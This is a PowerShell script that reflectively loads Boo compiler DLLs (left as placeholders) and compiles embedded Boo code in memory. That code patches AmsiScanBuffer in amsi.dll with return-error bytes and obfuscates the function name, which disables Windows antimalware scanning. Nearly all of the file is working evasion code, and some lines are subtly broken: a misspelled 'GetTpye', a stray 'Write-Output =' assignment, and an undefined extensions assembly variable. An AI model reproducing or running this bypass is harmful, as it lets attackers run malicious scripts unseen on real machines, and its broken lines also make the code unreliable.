function Invoke-BoolangAmsiPatch {
    $BooLangDLL = @'
<BOOLANG_DLL>
'@
    $BooLangCompilerDLL = @'
<BOOLANG_COMPILER_DLL>
'@
    $BooLangParserDLL = @'
<BOOLANG_PARSER_DLL>
'@
    $BoolangExtensionsDLL = @'
    <BOOLANG_EXTENSION_DLL>
'@

    function Load-Assembly($EncodedCompressedFile){
        $DeflatedStream = [IO.Compression.DeflateStream]::new([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile), [IO.Compression.CompressionMode]::Decompress)
        $UncompressedFileBytes = New-Object Byte[] (1900000)
        $DeflatedStream.Read($UncompressedFileBytes, 0, 1900000) | Out-Null
        return [Reflection.Assembly]::Load($UncompressedFileBytes)
    }
    $BooLangAsm = Load-Assembly($BooLangDLL)
    $BooLangCompilerAsm = Load-Assembly($BooLangCompilerDLL)
    $BooLangParserAsm = Load-Assembly($BooLangParserDLL)
    $BooSource = @'

import System
import System.Runtime.InteropServices

[DllImport("kernel32.dll", SetLastError: true, CharSet: CharSet.Unicode)]
public static def LoadLibrary(lpFileName as string) as IntPtr:
	pass
	
[DllImport("kernel32.dll", CharSet: CharSet.Ansi, ExactSpelling: true, SetLastError: true)]
public static def GetProcAddress(hModule as IntPtr, procName as string) as IntPtr:
	pass
	
[DllImport("kernel32.dll")]
public static def VirtualProtect(lpAddress as IntPtr, dwSize as int, flNewProtect as uint, ref lpfOldProtect as IntPtr) as bool:
	pass

public static def PatchMem(dll as string, function as string, patch as (byte)):
	try:
		oldProtect as IntPtr = 0
		library = LoadLibrary(dll)
		print ""
		print "[>] $(dll) address : $(library)"
		address = GetProcAddress(library, function)
		result = VirtualProtect(address, patch.Length, 0x40, oldProtect)
		Marshal.Copy(patch, 0, address, patch.Length)
		result = VirtualProtect(address, patch.Length, 0x20, oldProtect)
	except:
		print "[!] Error when Patching $(dll) : $(function)"
public static def Main():
	amsi_patch as (byte)
	if IntPtr.Size == 8:
		print "[*] x64"
		amsi_patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])
	else:
		print "[*] x86"
		amsi_patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00])
	PatchMem("am"+"si.dll", "Am"+"si"+"Sc"+"AnBu"+"ffer", amsi_patch)
'@
    $scriptinput = [Boo.Lang.Compiler.IO.StringInput]::new("MyScript.boo", $booSource)
    $parameters = [Boo.Lang.Compiler.CompilerParameters]::new($false)
    $parameters.Input.Add($scriptinput) | Out-Null
    $parameters.Pipeline = [Boo.Lang.Compiler.Pipelines.CompileToMemory]::new()
    $parameters.Ducky = $true
    $parameters.AddAssembly($BooLangAsm)
    $parameters.AddAssembly($BoolangExtensionsAsm)
    $parameters.AddAssembly($BooLangCompilerAsm)
    $parameters.AddAssembly($BooLangParserAsm)
    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("mscorlib"))
    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("System"))
    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("System.Core"))
    $compiler = [Boo.Lang.Compiler.BooCompiler]::new($parameters)
    Write-Output = "[*] Compiling"
    $context = $compiler.Run()

    if ($context.GeneratedAssembly -ne $null){
        Write-Output "[*] Execution"
        $scriptModule = $context.GeneratedAssembly.GetTpye("MyScriptModule")
        $mainfunction = $scriptModule.GetMethod("Main")
        $mainfunction.Invoke($null, $null)
    }
    else {
        Write-Output $context.Errors.ToString($true)
    }
}

